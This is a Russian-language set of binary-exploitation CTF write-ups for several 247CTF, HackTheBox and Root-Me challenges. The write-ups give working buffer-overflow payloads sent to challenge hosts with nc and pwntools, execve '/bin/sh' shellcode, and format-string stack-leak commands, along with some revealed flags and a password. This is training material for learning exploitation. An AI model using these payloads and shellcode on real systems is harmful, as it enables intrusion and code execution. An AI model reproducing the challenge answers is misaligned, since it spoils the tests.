 80485ce:	90                   	nop
 80485cf:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80485d2:	c9                   	leave
 80485d3:	c3                   	ret

 ...
```
### Создания полезной нагрузки

Мы видим, что ячейка памяти, в которой `flag()` функция находится `08048576`.

Итак, теперь у нас есть все, что нужно! Мы будем создавать наш эксплойт из:

```
76 bytes of arbitrary data`+ `memory location of flag() function
```

Для создания полезной нагрузки мы будем использовать Python. Нам нужно использовать запись с прямым порядком байтов в памяти, как мы выяснили с помощью checksec, что у нас есть 32-битная архитектура с записью с прямым порядком байтов.

```bash
(python2.7 -c 'from struct import pack; print b"A"*76 + pack("I", 0x08048576)') | nc e4e43f58b1f62e09.247ctf.com 50054
```


```bash
kali@kali:~$ python2.7 -c "print 'a' * 76 + '\x76\x85\x04\x08'"  | nc 2cbcd3c9791a8d95.247ctf.com 50465
How did you get here?
Have a flag!
247CTF{xxxx}
```

На Python3:

```python
(python3 -c 'from struct import pack; print(b"A"*76 + pack("I", 0x08048576))') | nc e4e43f58b1f62e09.247ctf.com 50054
```

Для преобразования кода из Python 2.7 в Python 3 нужно учитывать изменения в синтаксисе и функции вывода. В Python 3 нужно использовать байтовые строки и функции из модуля `struct` для упаковки данных.

В Python 3:

1. Используются байтовые строки, поэтому `"A"` заменяется на `b"A"`.
2. `print` в Python 3 является функцией, и для печати байтовых данных нужно использовать метод `sys.stdout.buffer.write` для корректного вывода байтовых данных.

В Python 3 мы используем `sys.stdout.buffer.write` вместо `print()` для вывода байтовых данных, потому что:

1. **`print()`**: По умолчанию `print()` в Python 3 работает с текстовыми (строковыми) данными и пытается закодировать их в соответствии с текущей системной кодировкой. Если вы попытаетесь напечатать байтовую строку с помощью `print()`, это может вызвать проблемы с кодировкой или преобразованиями, которые могут исказить байтовые данные. функция `print()` автоматически преобразует байтовые данные в строку, используя системную кодировку, что может привести к искажениям байтовых данных.
    
2. **`sys.stdout.buffer.write`**: Этот метод позволяет выводить байтовые данные напрямую в стандартный вывод без каких-либо преобразований. Это особенно важно при работе с бинарными данными, чтобы убедиться, что они не будут изменены или испорчены при выводе. Функция `sys.stdout.buffer.write` выводит байты напрямую, без каких-либо преобразований, что гарантирует, что данные будут переданы в точности такими, какими они были созданы.

Этот подход гарантирует, что байтовые данные будут переданы точно и без искажений, что особенно важно при работе с бинарными протоколами и данными в сетевых соединениях.

**Бережливая, ленивая и подлая доставка**

Чтобы облегчить себе жизнь, мы снова можем использовать pwntools. Таким образом, вместо записи с прямым порядком байтов в памяти `\76\85\04\08`, мы можем использовать [функцию упаковки](https://docs.pwntools.com/en/stable/util/packing.html) . Мы будем использовать `p32()`функция, чтобы сделать тяжелую работу для нас.


```bash
from pwn import *

io = remote('513cee9f2f0c29f5.247ctf.com', 50166)
# io = process('./hidden_flag_function')
# io = gdb.debug('./hidden_flag_function', 'b*chall+46')

payload = cyclic(76)
payload += p32(0x08048576)
io.sendline(payload)
io.interactive()

# 247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}
```

**Pwntools в профессиональном режиме**

```bash
$ pwn template ./hidden_flag_function --host 952ba8eab129134b.247ctf.com --port 50278 > exploit.py
$ chmod +x exploit
```

```fallback
./exploit LOCAL
```

```fallback
./exploit
```

---

## 0xDiablos

Платформа: https://www.hackthebox.com/
**Уровень:** Easy

### Проверка защиты памяти

Нам нужно проверить тип файла и защиту памяти в двоичном файле, прежде чем мы начнем наш эксплойт.

![[Pasted image 20230604072726.png]]

Он динамически связан и не разделен. Кроме того, нет PIE и бит NX не включен. 
### Основные функции

Мы могли бы попытаться найти некоторые интересные функции, которые мы могли бы использовать здесь. Чтобы найти все функции, я использовал «информационную функцию» в GDB.

![[Pasted image 20230604072744.png]]

- **main** - Основная функция
- **vuln** - Уязвимая функция 
- **flag** - Функция которая возвращает нам флаг

Логика проста, основная функция (main) вызывает уязвимую функция (vuln), а мы должны с уязвимой функции вызвать функцию который должен нам вернуть флаг (flag) с п.м. переполнение буфера. 

У нас есть две функции vuln () и flag(). Прежде чем пройтись по этим функциям, разберем «основную».

![[Pasted image 20230604072759.png]]

Мы видим вызов функции vuln() в файле main(). Ничего уязвимого в main(). Далее мы разбираем функцию vuln(). Мы видим, что здесь используется gets(). Так что это открывает возможность для переполнения буфера. Для этого нам нужно переполнить буфер, заполнение и EBP, чтобы достичь EIP. 

### Генерация шаблона 

Мы могли бы использовать «шаблон создать 200» внутри GDB-peda, чтобы создать случайный шаблон из 200 символов. Теперь запустите двоичный файл со следующим шаблоном внутри GDB.

![[Pasted image 20230604072821.png]]

Обратите внимание, как изменились регистры. EBP и EIP были перезаписаны шаблоном, который мы ввели в качестве входных данных. Теперь, чтобы найти начальное смещение EIP, мы можем использовать «смещение шаблона».

### Поиск смещений

![[Pasted image 20230604072840.png]]

Итак, 188 случайных символов для перезаписи буфера, заполнения и значения EBP.

Далее нам нужно разобрать flag(), чтобы посмотреть, что мы можем сделать с этой функцией. Эта часть заняла некоторое время, чтобы понять, как были вызваны функции сравнения строк. Я сделал здесь небольшой реверс-инжиниринг, но не понял. Поэтому я использовал Cutter, чтобы понять, что они здесь сделали.

![[Pasted image 20230604072900.png]]

Мы видим вызов fgets(), а затем проверку «если». Здесь мне потребовалось некоторое время, чтобы понять, что происходит. Очевидно, что был принят другой вход, и на этот раз нам нужно предоставить 2 входа (аргументы). Поэтому нам нужно увидеть четкую анатомию стека, прежде чем мы продолжим.

![[Pasted image 20230604072918.png]]

Нам нужно указать аргументы после адреса возврата. Но, очевидно, они упустили небольшую часть здесь. После адреса возврата у нас есть 4 байта пространства, прежде чем мы дадим наши аргументы. Так плохо рисовать полную диаграмму стека.

![[Pasted image 20230604072936.png]]

Поэтому я сделал свой эксплойт соответствующим образом на python:

### Создания полезной нагрузки

![[Pasted image 20230604072953.png]]

Не забудьте изменить значение хоста и порта. Выполнение этого даст наш флаг.

![[Pasted image 20230604073013.png]]

Надеюсь, вы поняли задачу. 

Источник: https://njkhanh.com
Ссылка: https://njkhanh.com/you-know-0xdiablos-hackthebox-pwn-p5f34313134

---

## Space

Платформа: https://www.hackthebox.com/
**Уровень:** Easy

Это пошаговое руководство относится к методологии, описанной [здесь](https://karol-mazurek95.medium.com/pwn-methodolodgy-linux-5c8355a8c9c2) .  
Это будет:

- лаконичный,
- прямо в точку.
- без ступенек, ведущих в кроличью нору.
### Основные проверки защиты

![[Pasted image 20230604080720.png]]

### Генерация шаблона для поиска смещение 

 **Отладить двоичный файл со строкой переполнения буфера в качестве входных данных:**

![[Pasted image 20230604080748.png]]
### Проверка смещение EIP

![[Pasted image 20230604080807.png]]
### Управление EIP с помощью пользовательских байтов

![[Pasted image 20230604080826.png]]

**Проверьте место для пользовательской полезной нагрузки:**

![[Pasted image 20230604080843.png]]

Для регистра EIP имеется пространство 18B + 9B, разделенное на 4 байта. Итак, полезная нагрузка может выглядеть так ( [отличная статья о прыжках](https://www.abatchy.com/2017/05/jumping-to-shellcode.html) ):

```
# Скелет полезной нагрузки:   
1. [2nd_stage_shellcode] = 18B   
2. [EIP] - переход на 1st_stage_shellcode = 4B   
3. [1st_stage_shellcode + jmp 2nd_stage_shellcode] = 9B
```

**Найдите гаджет ROP для EIP, чтобы запустить шеллкод:**

По сути, `jmp esp` просто переходите к потоку выполнения следующей инструкции в стеке — это будет шеллкод 1st_stage и еще один переход.

![[Pasted image 20230604081005.png]]

**Написание шеллкода:**

![[Pasted image 20230604081026.png]]

**Кастомизация шеллкода:**

EAX хранит (18B + 4B + 9B) данные, предоставленные в качестве входных данных во время переполнения.  
Без `mov esp, eax` шаг, `second_stage_shellcode` нарушит поток выполнения, потому что `pushed “0x6e69622f”` будет рассматриваться как данные для выполнения, в то время как они должны быть сохранены для дальнейшего выполнения **системного вызова** и рассматриваться как аргумент для `execve()`хранится в **регистре EBX** . (проверьте [эту статью](https://security.stackexchange.com/questions/98311/problems-executing-shellcode-via-nop-sled) )

Затем установите регистры EAX и ECX в 0. Короткий переход к первым 18 байтам в стеке. (Отличная статья, которая объясняет, почему мы прыгаем на 0xe2 — [доступна здесь](https://thestarman.pcministry.com/asm/2bytejumps.htm) )

![[Pasted image 20230604081058.png]]

Во-вторых, мы просто устанавливаем аргументы для [**execve()**](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) **.  
(Проверьте эту статью, если вы не знаете `CDQ` инструкция)

![[Pasted image 20230604081152.png]]

Окончательный шеллкод:

![[Pasted image 20230604081221.png]]

### Создание полезной нагрузки

```python
from pwn import *

second_stage_shellcode = "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\xb0\x0b\xcd\x80"  
eip = p32(0x0804919f)   
first_stage_shellcode = "\x89\xc4\x31\xc0\x89\xc1\xeb\xe2"  
payload = second_stage_shellcode + eip + first_stage_shellcodep = remote("139.59.166.56",30228)  
p.writeafter("> ",payload)  
p.interactive()
```

![[Pasted image 20230604081306.png]]


---

## jeeves

Платформа: https://www.hackthebox.com/
**Уровень:** Easy


Вскрывать оболочку — это здорово и весело, но это только одна цель эксплуатации. В этой задаче  наша цель — просто заставить двоичный файл выполнить «чувствительный» код. Я говорю чувствительный, потому что выполняемый код — это код, который предоставит нам флаг. Вы можете думать об этом как о принуждении двоичного файла к отображению некоторых других конфиденциальных данных, таких как пароли, информация о кредитной карте и т. д.


Вам понадобится дизассемблер. я буду использовать Ghidra , но вместо этого вы можете использовать IDA ! Вы также должны скачать pwntools также. Это отличный хакерский фреймворк. Вы можете установить его с помощью pip install pwntools. Хорошо, с этим покончено, давайте начнем!


### Начальная сортировка

Теперь мы не получили исходный код для этой задачи, поэтому нам нужно выполнить реверсирование, чтобы выяснить, как использовать двоичный файл. Шаги такие же, как мы обычно делаем, поэтому давайте начнем с запуска **file**. 

![[Pasted image 20230528033943.png]]

Это выглядит довольно просто. Двоичный файл является 64-битным и не лишен символов. Итак, давайте посмотрим на символы и посмотрим, что мы можем узнать!

![[Pasted image 20230528034014.png]]
![[Pasted image 20230528034036.png]]

Мы видим несколько интересных вызовов функций (`malloc, open,и read`). Конечно, мы не знаем, в каком контексте используются эти функции, но интересно знать, что они используются. Наконец, мы также видим `main`  функция, но это не очень интересно. Теперь давай
побежим strings.

![[Pasted image 20230528034215.png]]
>вывод строк

Похоже на файл `flag.txt` каким-то образом будет напечатано на экране. Мы определенно хотим выяснить, как получить содержимое этого файла.

### Проверка защиты памяти

Прежде чем мы откроем это в `Ghidra`, давайте запустим `checksec` команда, которую мы получаем от `pwntools`  библиотека питона.

![[Pasted image 20230528034322.png]]
>вывод контрольной секунды

Давайте пройдемся по списку, объясняющему каждую из этих записей. RelRO — это мера безопасности, похожая на NX, но она делает разделы двоичного файла доступными только для чтения. Я не буду вдаваться в подробности, но глобальная таблица смещений (GOT)
очень часто помечается как доступная только для чтения. GOT — это то, как бинарные карты сопоставляют адреса функций в разделяемых
библиотеках (т. е. ваши `printf`, `strcpy`, так далее.). В этом случае включен полный RelRO, что означает, что вся таблица глобальных смещений (GOT) помечена как доступная только для чтения. Если вы хотите узнать больше об этой защите, прочтите этот пост в блоге или этот блоге.

Если вы не знаете, что такое GOT, то лучше почитайте о нем). Checksec сообщает, что канарейка не найдена. Мы говорили о стековых канарейках в предыдущем посте блога . По сути, стековая канарейка — это защитный механизм от переполнения буфера, который помещает лучайное значение в стек. Идея в том, что если вы попытаетесь выполнить переполнение буфера, канареечное значение будет перезаписано.

Прежде чем функция вернется, это канареечное значение проверяется. Если он изменился, программа может корректно завершить работу и пожаловаться на обнаружение переполнения буфера. В этом двоичном файле не включены канарейки стека, поэтому не нужно
беспокоиться об этом механизме. Далее мы видим NX. Это еще один механизм защиты от переполнения буфера, который помечает стек как неисполняемый. Исторически злоумышленники могли выполнять произвольный код, помещая инструкции в стек и изменяя указатель инструкций на инструкции, контролируемые атакой. Затем ЦП с радостью выполнит инструкции, потому что, когда компьютеры видят
инструкции, они просто их выполняют. Это было явно нежелательно, поэтому стек был помечен как неисполняемый, что предотвращает атаки такого типа. 

Однако есть способы вокруг этого , но это разговор на другой день. Независимый от позиции исполняемый файл (PIE) просто означает, что адреса инструкций двоичного файла не будут фиксированными. Guyinatuxedo по блоге этой теме. Хорошо, со всем этим мы можем открыть это в Ghidra!

### Статический анализ с Ghidra 

![[Pasted image 20230528035532.png]]
>основная функция

Мы видим, что двоичный файл начинается с установки переменной, `local_c` к `0xdeadc0d3`. Затем мы видим, что он распечатывает cообщение, которое мы видели из strings вывод и запрашивает ввод данных пользователем. Мы знаем это `local_48` будет нашим
`user_input`  потому что он загружается в параметр `RDI` перед вызовом gets. Напомним, что для 64-битных двоичных файлов параметры передаются в регистрах. Давайте продолжим и переименуем `local_48`  к  `user_input` и `local_c` к `is_0xdeadc0d3` в обычном стиле
Jaybailey216)). Хорошо, давайте углубимся в код.

![[Pasted image 20230528041947.png]]
![[Pasted image 20230528042000.png]]
>основная функция продолжение

Затем код просто выводит то, что мы набрали, используя ``%s``  спецификатор формата. Затем мы видим `is_0xdeadc0d3`  по сравнению с  `0x1337bab3`  (это детка в `hax0r`  говорить ;)). У того, кто написал этот челлендж, хорошее чувство юмора, и я одобряю! Итак, эта проверка всегда будет терпеть неудачу, потому что is_0xdeadc0d3  жестко запрограммировано со значением, которое НЕ  `0x1337bab3`. Поэтому инструкции внутри  `if`   оператор по сути является мертвым кодом. Ааа, это объясняет умное задание! Давайте внимательнее посмотрим на этот мертвый код. Первое, что мы видим, это  `local_18`  является  `malloc'd`  с  `0x100`  как параметр, который выглядит как `local_18 = malloc(0x100)`.  Давайте переименуем  local_18  к  flag  . Я знаю, что мы еще не проверили, что это будет держать флаг, но просто поверьте мне в этом. Затем мы видим **flag.txt**  передается в  open  функция. Результат open  вызов функции хранится в  `local_1c`  так что мы можем переименовать это в  **fd**  (дескриптор файла). После открытия файла вызов аргументов для `read`   функции помещаются в соответствующие регистры.

![[Pasted image 20230528042911.png]]
>Основная функция часть 3

После  `read`  вызывается функция, мы видим содержимое **flag.txt**  печатается на экране. Хотя разборка выше не показана, полный аргумент
`printf`  функция "Приятно познакомиться. Вот небольшой подарок: ``%s\n"``, где flag  будет размещен в  %s  спецификатор формата. Как обычно, давайте продолжим и напишем, как мог бы выглядеть соответствующий код C.

```c
is_0xdeadc0d3 = 0xdeadc0d3
printf("Hello good sir!\nMay I have your name\n");
gets(user_input);
printf("Hello %s, hope you have a good day!\n");
if(is_0xdeadc0d3 == 0x1337bab3)
{
    flag = (char*) malloc(0x100);
    fd = open("flag.txt", 0);
    read(fd, &flag, 0x100);
    printf("Pleased to make your acquaintance. Here's a small gift: %s\n"
    close(fd);
}
return 0;
```

Хорошо, мы знаем, что для выполнения мертвого кода переменная  `is_deadc0d3`  должен быть изменен. Проблема в том, что у нас нет прямого контроля над этой переменной. Нигде в коде мы не видим, чтобы эта переменная менялась, так что же нам делать? Мы можем
попробовать что-то довольно сложное и выполнить переполнение буфера и установить адрес возврата равным  `0x0010123`  который начнет выполнение `malloc`  инструкция. Однако, поскольку этот двоичный файл имеет довольно строгие меры по предотвращению переполнения буфера, это может потребовать больше усилий, чем пользы. Ну, мы знаем, что контролируем содержимое  `user_input`  переменная. И, похоже, нет никакой проверки границ пользовательского ввода. Возможно, мы сможем воспользоваться тем фактом, что оба  `user_input`  и  `is_deadc0d3`  переменная находится в стеке. Более того,  `user_input`  находится ниже в стеке, поэтому мы могли перезаписать значение.

`is_deadc0d3`  со значением, ожидаемым программой. Сначала мы должны узнать, сколько байтов между ними,  user_input  и `is_deadc0d3` Вероятно, есть гораздо более элегантное решение, но я покажу вам, как я рассчитал расстояние. 
 
Давайте еще раз взглянем на Ghidra, особенно на ту часть, где она рассказывает нам о локальных переменных стека. 

![[Pasted image 20230528043650.png]]
>Смещения стека

На изображении выше мы видим, что `user_input`  находится на смещении  `0x48`  пока `is_deadc0d3`  находится на смещении  `0xc` . Чтобы вычислить расстояние, мы можем просто вычесть два смещения, чтобы получить  `0x3C`  или 60. Это означает, что между  `user_input`  и
`is_deadc0d3` . Давайте проверим это. Откроем бинарник в  gdb  и установите точку  останова после того, как пользовательский ввод будет принят, и проверьте стек. Поскольку этот двоичный файл имеет  PIE  включен, нам нужно будет установить точку останова, используя  gef  функция называется  pie break . Это позволяет нам установить точку останова на PIE  исполняемые файлы. Затем, чтобы запустить бинарный файл, мы должны  pie run  чтобы запустить бинарник с нашим  pie точка останова. 

![[Pasted image 20230528050913.png]]
>Установка точки останова круговой диаграммы и запуск двоичного файла

### Вычисление смещений

Когда мы запустим двоичный файл, он предложит нам ввести пользовательский ввод. Я собираюсь поставить около 30 А. Это не приведет к перезаписи нашей переменной, но я хочу, чтобы мы проверили стек перед тем, как выполнить перезапись. Я думаю, что это будет хорошей иллюстрацией для нас.

![[Pasted image 20230528050955.png]]
>Стек после ввода данных пользователем

Это доказывает нашу теорию ранее, что   `user_input` находится ниже в стеке, чем `is_deadc0d3`. Это означает, что мы действительно можем поставить 60 A и перезаписать `is_deadc0d3`  со значением по нашему выбору. Давайте сделаем это

сейчас. Поскольку мы уже запускали двоичный файл один раз, нам не нужно использовать  pie run  команда. Вместо этого давайте использовать обычный run  команда, но мы собираемся предоставить немного Python в качестве входных данных. Для этого нам нужно
выполнить  run  команда так:  `r <<< $(python -c "print 'A'*60 + '\xb3\xba\x37\x13'")`  . Обратите внимание, что мы написали  `0x1337bab3`  в обратном порядке. Это связано с тем, что мы имеем дело с машиной с прямым порядком байтов, и мы должны предоставлять байты в обратном порядке. Если вы не совсем понимаете, что это нормально, просто знайте, что во многих ситуациях вам придется изменить порядок байтов, чтобы он правильно интерпретировался. 

![[Pasted image 20230528051403.png]]
>Перезапись переменной is_deadc0d3

Как видите, мы смогли изменить  `is_deadc0d3`  переменная. Итак, мертвый код теперь будет выполняться, потому что теперь сравнение пройдет.

![[Pasted image 20230528051514.png]]
>Успешно выполнен мертвый код

Большой! Мы выполнили мертвый код! Теперь у нас нет flag.txt  на нашей локальной машине. Поэтому нам придется разработать эксплойт для запуска против сервера, на котором запущено уязвимое приложение. Я сделал следующее ниже.

### Создания полезной нагрузки

```python
import socket

HOST = "46.101.84.35"
PORT = 30988

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((HOST,PORT))
    data = b"A"*60 + b"\xb3\xba\x37\x13"
    sock.send(data)
    dataFromServer = sock.recv(1024)

except socket.error:
    print("Failed to send data")
```

Вам вероятно придется изменить IP-адрес и номер порта при запуске экземпляра двоичного файла. Этот скрипт поместит 60 «А», которые будут заполнять память до тех пор, пока  is_deadc0d3  переменная, а затем перезапишите ее с помощью  0x1337bab3. Теперь, по какой-то причине, когда я запускаю этот скрипт, я не получаю никакого вывода. Если есть профессионалы Python, пожалуйста, дайте мне знать, где я ошибаюсь с этим скриптом. Что мне нужно сделать, так это захватить трафик в Wireshark. После того, как я запускаю скрипт, он просто зависает. Однако, когда я  Ctrl-C  , я получаю ввод, но не по команде, а в выводе Wireshark. Я опубликую несколько фотографий того, как это
выглядит, включая флаг. 

![[Pasted image 20230528053857.png]]
>Скрипт просто висит здесь

На изображении выше скрипт просто висит прямо здесь. Данные отправляются на сервер, хотя это немного сложно увидеть на этом изображении.

![[Pasted image 20230528053941.png]]

![[Pasted image 20230528053957.png]]
>После выхода из скрипта

После выхода из сценария я получаю ожидаемый результат, но только в Wireshark, а не в терминале. Кроме того, полный вывод здесь не отображается, поэтому мне нужно следить за потоком TCP, чтобы увидеть полный флаг.

![[Pasted image 20230528054037.png]]
>Вывод флага

Теперь я вижу полный флаг, но он никогда не печатается на терминале, как я ожидал. Я не уверен, что я сделал неправильно в скрипте Python, но я открыт для любых предложений ;)). Но это все! Мы успешно выполнили наш первый подвиг! Не слишком сложно, верно? В будущем мы перейдем к более продвинутой эксплуатации. Я знаю, это то, чего вы хотите, но мы должны ползти, прежде чем сможем ходить.

Благодаря любезному зрителю (codenamev) я понял, что я делал не так. В моем исходном коде мне не удалось включить символ новой строки в конце моих данных. Следующий код будет работать. Также будет работать код из обновления от 10.03.2021. Выбрать свой яд! 

```python
import socket

HOST = "138.68.141.81"
PORT = 32159

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
     sock.connect((HOST,PORT))
     data = b"A"*60 + b"\xb3\xba\x37\x13\n"
     sock.send(data)
     dataFromServer = sock.recv(1024)
     print(dataFromServer)
 
 except socket.error:
     print("Failed to send data") 
 ```

Поэтому я до сих пор не уверен, почему мое решение выше не сработало, но приведенный ниже код должен
работать!


```python
from pwn import *
target = process("nc")
target.sendline("<IP> <PORT>")
data = b"A"*60
data += p64(0x1337bab3)
target.sendline(data)
print(target.recvuntil('}'))
```
 
Эта задача была немного проще, но она позволила нам выполнить очень простой эксплойт. Как я упоминал ранее, эксплуатация не всегда приводит к лопанию снарядов. На этот раз это позволило нам выполнить «мертвый код», и это само по себе является эксплойтом!  понимание того, как это работает, является ступенькой к более изощренным эксплойтам в будущем.  

---

# [[Lab 7 Format String Vulnerability.pdf |  Format String ]]  


## ELF x86 - Format string bug basic 1

Платформа: https://www.root-me.org/
**Уровень:** Easy

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

Этот бинарь без харденинг защит, поэтому тут все просто. Уязвимость тут находится в ```printf(argv[1])```; Так как не были указаны форматы вывода. Эта уязвимость форматной строки. Поэтому у нас есть примитивы как чтения из стека так и запись в память. Тут нам нужен примитив чтения, потому, как флаг находится в файле .passwd.  
  
И мы сможем прочитать от туда данные используя спецификатор формата %x  
  
Суть эксплуатации этой уязвимости заключаться в том, чтобы считать значения со стека. В стеке находится буфер, а в буфере содержимое файла .passwd  

### Эксплойт
  
Выведем 128 байт из стека 32 * 4 = 128  

```
Код:

./ch5 $(python -c 'print "%08x."*32')
```

  
%08х число после знака процента нужно чтобы отображать по 4 байта  
  
```
Код:

FF|FF|FF|FF
```

![[Pasted image 20230602054748.png]]


Скопируем полученные байты в блокнот.  Данный нам ELF бинарник 32 битный. Архитектура x86 -  Поэтому все полученные байты выданные нам из стека находятся в перевернутом виде - Little Endian.  
  
Например  

```
Код:

Если -> 00000020 тогда -> 20|00|00|00
Или вот еще пример
28293664 -> 64|36|29|28
```

  
Поэтому чтобы в ручную не переписывать каждую цепочку байтов. Воспользуемся питоном для автоматизации, перевернем все байты, а за одно и декодируем их...  
  
**decode_bytes.py**  

```python
bytes = [ "00000020", "0804b160", "0804853d", "00000009",
          "bffffcce", "b7e1c4a9", "bffffba4", "b7fc4000",
          "b7fc4000", "0804b160", "39617044", "28293664",
          "6d617045", "bf000a64", "0804861b", "00000002",
          "bffffba4", "bffffbb0", "119eaa00", "bffffb10",
          "00000000", "00000000", "b7e04e81", "b7fc4000",
          "b7fc4000", "00000000", "b7e04e81", "00000002",
          "bffffba4", "bffffbb0", "bffffb34", "00000001" ]

bytes2 = []

for y in bytes:
    little_endian = y[6:] + y[4:-2] + y[2:-4] + y[0:-6]
    bytes2.append(little_endian)
   

for x in bytes2:
    print x.decode('hex'),
```

![[Pasted image 20230602054826.png]]

После запуска на выходе мы получим такие данные и флаг ![;)](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "Wink    ;);)

### Решение №2 (более легкое)

Просмотрим условие задания, нам доступен исходный код.

![[Pasted image 20230602060136.png]]

Ключевая строка в коде - строка номер 8. Уязвимость форматной строки заключается в том, что используется некоторая функция форматного вывода без указания формата (строка 8), следовательно, мы можем сами указывать формат вывода, а это ведёт к проблеме, т.к. мы сможем читать значения со стека и писать в память. В нашем случае нам нужно прочитать значение со стека.

Откроем WebSSH и попробуем проэксплуатировать уязвимость. Про уязвимость форматной строки, на канале пока что не было постов, однако вы можете подробно изучить её самостоятельно (но пост скоро будет). Если Вам нужно краткое описание, то оно представлено выше.

Смысл эксплуатации будет заключаться в том, чтобы считать значения со стека, т.к. на стеке находится буфер, в который считывается содержимое файла с паролем. Один из самых простых способов получения значений со стека при наличии уязвимости форматной строки - это отправка последовательности состоящей из множества сочетаний символов "%х". Данное сочетание указывает, что выводимые данные будут представлены в 16-ричном формате, однако, в случае, когда аргументов в функции вывода больше нет, а мы указали формат, данные будут взяты со стека (это связано с тем, что в архитектуре х86 аргументы в функции передаются через стек).

Итак, попробуем проэксплуатировать уязвимость.

![[Pasted image 20230602060201.png]]

Используемая команда: 

```
./ch5 `python -c 'print "%08x"*20'`
```

Данной командной мы передаём на вход исполняемому файлу последовательность из "%08х" сгенерированную с помощью python. После чего исполняемый файл выводит нам содержимое стека. Здесь нам интересны лишь некоторые значения, поэтому разобьём нашу большую строку на кусочки по 8 символов (по 4 байта как на стеке).

![[Pasted image 20230602060304.png]]

Выделенный блок содержит множество 16-ричных значений, которые могут быть преобразованы в понятные человеку ASCII-символы, предположим, что это наша строка и выделим её из данного блока.

![[Pasted image 20230602060319.png]]

Здесь стоит сразу сказать об порядке хранения значений на стеке в архитектуре x86. Дело в том, что значения на стеке хранятся в обратной порядке, так называемый Little Endian или LE, подробнее об этом можно почитать в Интернете. Нам это нужно для верного преобразования строки, т.к. в конце мы видим значение 00 00 0а 64, дело в том, что значение 0х0а - это символ перевода строки (например, нажатие Enter), а 0х64 - последнее значение строки, нули которые идут после - являются стандартными значениями на стеке (хотя один из нулей является концом строки). По этой же логике необходимо развернуть все строки со значениями, в итоге получим.

![[Pasted image 20230602060332.png]]

Теперь декодируем эту последовательность.

![[Pasted image 20230602060344.png]]

И получаем верный пароль - "Dpa9d6)(Epamd".


